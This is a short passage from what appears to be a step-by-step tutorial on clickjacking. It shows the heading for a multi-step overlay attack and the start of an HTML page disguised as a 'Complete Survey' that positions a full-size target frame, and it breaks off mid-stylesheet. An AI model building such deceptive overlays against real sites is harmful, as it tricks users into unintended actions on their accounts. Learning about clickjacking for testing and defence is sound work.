### Step 4: Create Multi-Step Clickjacking Attack

For actions requiring multiple clicks, create a multi-step overlay.

```html
<!-- multi-step-clickjacking.html -->
<html>
<head>
<title>Complete Survey</title>
<style>
  #target-frame {
    position: absolute;
    width: 100%;
    height: 100%;
